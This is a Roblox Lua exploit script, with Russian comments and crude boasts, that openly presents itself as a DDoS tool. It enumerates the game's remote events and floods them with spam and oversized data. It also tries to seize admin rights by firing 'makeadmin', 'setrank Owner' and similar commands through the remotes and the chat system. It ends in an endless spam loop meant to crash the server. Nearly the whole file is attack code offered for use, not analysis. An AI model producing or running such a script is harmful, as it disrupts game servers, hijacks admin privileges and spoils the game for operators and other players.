print("=========================================")
print("[ДДОС-СКАНЕР] ИЩУ ДЫРЫ В СЕРВЕРЕ, ЕБЛАН!")
print("=========================================")

local plr = game.Players.LocalPlayer
local RS = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

-- ==========================================
-- 1. ПОИСК RemoteEvent БЕЗ ПРОВЕРОК
-- ==========================================
print("[1] ИЩУ RemoteEvent БЕЗ ЗАЩИТЫ...")

local vulnerableRemotes = {}
local allRemotes = {}

-- Функция поиска всех RemoteEvent
local function FindAllRemotes(folder, path)
    path = path or ""
    for _, child in pairs(folder:GetChildren()) do
        local currentPath = path .. "/" .. child.Name
        if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
            table.insert(allRemotes, {
                name = child.Name,
                class = child.ClassName,
                path = currentPath,
                ref = child,
                parent = child.Parent.Name
            })
        end
        if child:IsA("Folder") or child:IsA("Model") or child:IsA("ScreenGui") then
            FindAllRemotes(child, currentPath)
        end
    end
end

-- Сканируем все папки
FindAllRemotes(RS)
FindAllRemotes(workspace)
FindAllRemotes(game:GetService("Players"))
FindAllRemotes(game:GetService("StarterGui"))

print("[НАЙДЕНО] "..#allRemotes.." RemoteEvent/RemoteFunction")

-- ==========================================
-- 2. ТЕСТ НА СПАМ-УЯЗВИМОСТЬ
-- ==========================================
print("[2] ТЕСТИРУЮ НА СПАМ-АТАКИ...")

local function TestSpamVulnerability(remote)
    local success = false
    
    -- Пытаемся заспамить 100 вызовов за 0.1 секунду
    for i = 1, 100 do
        pcall(function()
            remote:FireServer("ping", i, HttpService:GenerateGUID(false))
            remote:FireServer("test", i, i*2, "spam_"..i)
            remote:FireServer("", i, {data = "spam"})
        end)
    end
    
    -- Проверяем, не упал ли сервер (проверка через пинг)
    local start = tick()
    pcall(function()
        if remote:IsA("RemoteFunction") then
            remote:InvokeServer("ping")
        end
    end)
    local endTime = tick() - start
    
    if endTime > 1 then
        print("[УЯЗВИМОСТЬ] "..remote.Name.." тормозит при спаме!")
        table.insert(vulnerableRemotes, {
            name = remote.Name,
            type = "spam",
            delay = endTime
        })
        success = true
    end
    
    return success
end

-- Тестируем каждый RemoteEvent
for _, remote in pairs(allRemotes) do
    if remote.class == "RemoteEvent" then
        TestSpamVulnerability(remote.ref)
    end
end

-- ==========================================
-- 3. ПОИСК БЕЗЛИМИТНЫХ RemoteEvent
-- ==========================================
print("[3] ИЩУ RemoteEvent БЕЗ ЛИМИТОВ...")

local function FindLimitlessRemotes()
    for _, remote in pairs(allRemotes) do
        if remote.class == "RemoteEvent" then
            -- Проверяем, есть ли проверка на частоту вызовов
            local hasLimit = false
            for _, script in pairs(game:GetDescendants()) do
                if script:IsA("Script") then
                    pcall(function()
                        local src = script.Source
                        if src and string.find(src, remote.name) then
                            if string.find(src:lower(), "cooldown") or 
                               string.find(src:lower(), "throttle") or
                               string.find(src:lower(), "ratelimit") then
                                hasLimit = true
                            end
                        end
                    end)
                end
            end
            
            if not hasLimit then
                print("[БЕЗЛИМИТНЫЙ] "..remote.name.." - можно спамить!")
                table.insert(vulnerableRemotes, {
                    name = remote.name,
                    type = "nolimit"
                })
            end
        end
    end
end

FindLimitlessRemotes()

-- ==========================================
-- 4. ПОИСК УЯЗВИМОСТЕЙ В RemoteFunction
-- ==========================================
print("[4] ИЩУ УЯЗВИМОСТИ В RemoteFunction...")

for _, remote in pairs(allRemotes) do
    if remote.class == "RemoteFunction" then
        local func = remote.ref
        
        -- Тестируем на перегрузку
        local start = tick()
        for i = 1, 50 do
            pcall(function()
                func:InvokeServer("bigdata", string.rep("A", 1000 * i))
                func:InvokeServer("test", {data = string.rep("B", 10000)})
                func:InvokeServer("ping", i)
            end)
        end
        local endTime = tick() - start
        
        if endTime > 2 then
            print("[УЯЗВИМОСТЬ RemoteFunction] "..remote.name.." тормозит на больших данных!")
            table.insert(vulnerableRemotes, {
                name = remote.name,
                type = "bigdata",
                delay = endTime
            })
        end
    end
end

-- ==========================================
-- 5. ПОИСК СКРЫТЫХ КОМАНД ДЛЯ ВЗЛОМА
-- ==========================================
print("[5] ИЩУ СКРЫТЫЕ КОМАНДЫ В СКРИПТАХ...")

local hiddenCommands = {}

local function FindCommandsInScripts()
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("Script") then
            pcall(function()
                local src = obj.Source
                if src then
                    -- Ищем команды
                    local patterns = {
                        "FireServer%s*%([\"']([%w_]+)[\"']",
                        "InvokeServer%s*%([\"']([%w_]+)[\"']",
                        "command%s*=%s*[\"']([%w_]+)[\"']",
                        "cmd%s*=%s*[\"']([%w_]+)[\"']",
                        "action%s*=%s*[\"']([%w_]+)[\"']",
                        "[\"']admin[\"']",
                        "[\"']makeadmin[\"']",
                        "[\"']setrank[\"']",
                        "[\"']promote[\"']",
                        "[\"']owner[\"']",
                        "[\"']god[\"']",
                        "[\"']kick[\"']",
                        "[\"']ban[\"']",
                        "[\"']tp[\"']",
                        "[\"']teleport[\"']",
                    }
                    
                    for _, pattern in pairs(patterns) do
                        local matches = string.gmatch(src, pattern)
                        for match in matches do
                            if not hiddenCommands[match] then
                                hiddenCommands[match] = true
                                print("[КОМАНДА] "..match.." в "..obj.Name)
                            end
                        end
                    end
                end
            end)
        end
    end
end

FindCommandsInScripts()

-- ==========================================
-- 6. АТАКА НА СЕРВЕР (ДДОС-СПАМ)
-- ==========================================
print("[6] ЗАПУСКАЮ ДДОС-АТАКУ НА НАЙДЕННЫЕ ДЫРЫ...")

local function DDOSAttack(remote, count)
    count = count or 1000
    print("[ДДОС] Атакую "..remote.name.." ("..count.." запросов)")
    
    for i = 1, count do
        pcall(function()
            -- Разные типы данных для перегрузки
            local dataTypes = {
                "ping",
                "test",
                {data = string.rep("A", 1000)},
                {cmd = "exec", args = {string.rep("B", 500)}},
                "admin",
                plr.Name,
                plr.UserId,
                "spam_"..i,
                {i, i*2, i*3, string.rep("C", 100)},
                {action = "spam", value = i, data = HttpService:GenerateGUID(false)},
            }
            
            for _, data in pairs(dataTypes) do
                remote:FireServer(data)
            end
        end)
        task.wait()
    end
end

-- Атакуем все уязвимые RemoteEvent
for _, remote in pairs(allRemotes) do
    if remote.class == "RemoteEvent" then
        -- Начинаем атаку в отдельном потоке
        coroutine.wrap(function()
            DDOSAttack(remote.ref, 500)
        end)()
    end
end

-- ==========================================
-- 7. АТАКА НА RemoteFunction (перегрузка)
-- ==========================================
print("[7] АТАКУЮ RemoteFunction...")

for _, remote in pairs(allRemotes) do
    if remote.class == "RemoteFunction" then
        local func = remote.ref
        coroutine.wrap(function()
            for i = 1, 200 do
                pcall(function()
                    func:InvokeServer("big", string.rep("X", 10000))
                    func:InvokeServer("test", {i, i*2, string.rep("Y", 5000)})
                    func:InvokeServer("ping", i, string.rep("Z", 1000))
                    func:InvokeServer("admin", plr.Name)
                    func:InvokeServer("getdata", i)
                end)
                task.wait()
            end
        end)()
    end
end

-- ==========================================
-- 8. ПОПЫТКА ВЗЛОМАТЬ АДМИНКУ ЧЕРЕЗ НАЙДЕННЫЕ КОМАНДЫ
-- ==========================================
print("[8] ПЫТАЮСЬ ВЗЛОМАТЬ АДМИНКУ...")

local function TryAdminHack()
    local commands = {}
    
    -- Добавляем все найденные команды
    for cmd, _ in pairs(hiddenCommands) do
        table.insert(commands, cmd)
    end
    
    -- Добавляем стандартные
    local defaultCommands = {
        "makeadmin", "addadmin", "setadmin", "giveadmin",
        "rank", "setrank", "promote", "admin", "owner",
        "god", "mod", "vip", "op", "sudo"
    }
    
    for _, cmd in pairs(defaultCommands) do
        table.insert(commands, cmd)
    end
    
    -- Пытаемся вызвать каждую команду на каждом RemoteEvent
    for _, remote in pairs(allRemotes) do
        if remote.class == "RemoteEvent" then
            local ref = remote.ref
            for _, cmd in pairs(commands) do
                pcall(function()
                    ref:FireServer(cmd, plr.Name)
                    ref:FireServer(cmd, plr.UserId)
                    ref:FireServer(cmd, plr.Name, "Owner")
                    ref:FireServer(cmd, plr.UserId, "Admin")
                    ref:FireServer({cmd = cmd, player = plr.Name})
                    ref:FireServer({action = cmd, target = plr.Name})
                end)
                task.wait(0.01)
            end
        end
    end
end

TryAdminHack()

-- ==========================================
-- 9. АТАКА ЧЕРЕЗ ЧАТ-КОМАНДЫ
-- ==========================================
print("[9] АТАКУЮ ЧЕРЕЗ ЧАТ...")

local function ChatAttack()
    local chat = RS:FindFirstChild("DefaultChatSystemChatEvents")
    if chat then
        local say = chat:FindFirstChild("SayMessageRequest")
        if say then
            local commands = {
                "/admin "..plr.Name,
                "/makeadmin "..plr.Name,
                "/setadmin "..plr.Name,
                "/rank "..plr.Name.." Owner",
                "/op "..plr.Name,
                "/god "..plr.Name,
                "/adminme",
                "/opme",
                "/setrank Owner",
                "/addadmin "..plr.Name,
                "!"..plr.Name.." admin",
                "."..plr.Name.." makeadmin",
                "-admin "..plr.Name,
                "/giveadmin "..plr.Name,
                "admin "..plr.Name,
                "makeadmin "..plr.Name,
                "/kick "..plr.Name,
                "/ban "..plr.Name,
                "/teleport "..plr.Name,
                "/tp "..plr.Name,
            }
            
            for i = 1, 100 do
                for _, cmd in pairs(commands) do
                    pcall(function()
                        say:FireServer(cmd, "All")
                    end)
                    task.wait(0.02)
                end
            end
        end
    end
end

ChatAttack()

-- ==========================================
-- 10. ПОПЫТКА СЛОМАТЬ СЕРВЕР ЧЕРЕЗ INSTANCE
-- ==========================================
print("[10] ПЫТАЮСЬ СОЗДАТЬ МИЛЛИОН ОБЪЕКТОВ...")

local function InstanceOverload()
    for i = 1, 1000 do
        pcall(function()
            local part = Instance.new("Part")
            part.Name = "DDOS_"..i
            part.Size = Vector3.new(100, 100, 100)
            part.Position = Vector3.new(math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000))
            part.Parent = workspace
            part.Anchored = true
            part.CanCollide = false
            part.Transparency = 1
        end)
        task.wait()
    end
end

InstanceOverload()

-- ==========================================
-- 11. ПОПЫТКА СЛОМАТЬ ЧЕРЕЗ MEMORY LEAK
-- ==========================================
print("[11] ПЫТАЮСЬ ВЫЗВАТЬ MEMORY LEAK...")

local function MemoryLeak()
    local tables = {}
    for i = 1, 10000 do
        local t = {}
        for j = 1, 100 do
            t[j] = string.rep("MEMORY_LEAK_", 1000) .. i .. "_" .. j
        end
        tables[i] = t
    end
end

MemoryLeak()

-- ==========================================
-- 12. ФИНАЛЬНЫЙ ОТЧЕТ
-- ==========================================
print("=========================================")
print("[ОТЧЕТ] ДДОС-СКАНЕР ЗАВЕРШИЛ РАБОТУ!")
print("=========================================")

if #vulnerableRemotes > 0 then
    print("[НАЙДЕНО УЯЗВИМОСТЕЙ] "..#vulnerableRemotes)
    for _, v in pairs(vulnerableRemotes) do
        print("  - "..v.name.." ("..v.type..")")
    end
else
    print("[НЕТ] УЯЗВИМОСТЕЙ НЕ НАЙДЕНО")
end

if #hiddenCommands > 0 then
    print("[НАЙДЕНО КОМАНД] "..#hiddenCommands)
    for cmd, _ in pairs(hiddenCommands) do
        print("  - "..cmd)
    end
else
    print("[НЕТ] СКРЫТЫХ КОМАНД НЕ НАЙДЕНО")
end

print("=========================================")
print("[ИТОГ] ЕСЛИ СЕРВЕР НЕ УПАЛ - ОН ЗАЩИЩЕН")
print("[ИТОГ] ЕСЛИ СЕРВЕР УПАЛ - ТЫ ДДОСНУЛ!")
print("=========================================")

-- ==========================================
-- 13. БЕСКОНЕЧНЫЙ СПАМ (если нужно)
-- ==========================================
print("[БЕСКОНЕЧНЫЙ СПАМ] НАЧИНАЮ НЕОСТАНАВЛИВАЕМУЮ АТАКУ...")

-- ЭТОТ ЦИКЛ НЕ ОСТАНОВИТСЯ, ПОКА ТЫ НЕ ПЕРЕЗАЙДЕШЬ!
while true do
    for _, remote in pairs(allRemotes) do
        if remote.class == "RemoteEvent" then
            pcall(function()
                remote.ref:FireServer("ping", tick(), HttpService:GenerateGUID(false))
                remote.ref:FireServer("spam", string.rep("A", 1000))
                remote.ref:FireServer("test", {data = string.rep("B", 500), time = tick()})
                remote.ref:FireServer("", {})
                remote.ref:FireServer(plr.Name, plr.UserId, tick())
            end)
        end
        task.wait(0.001) -- Максимальная скорость!
    end
end
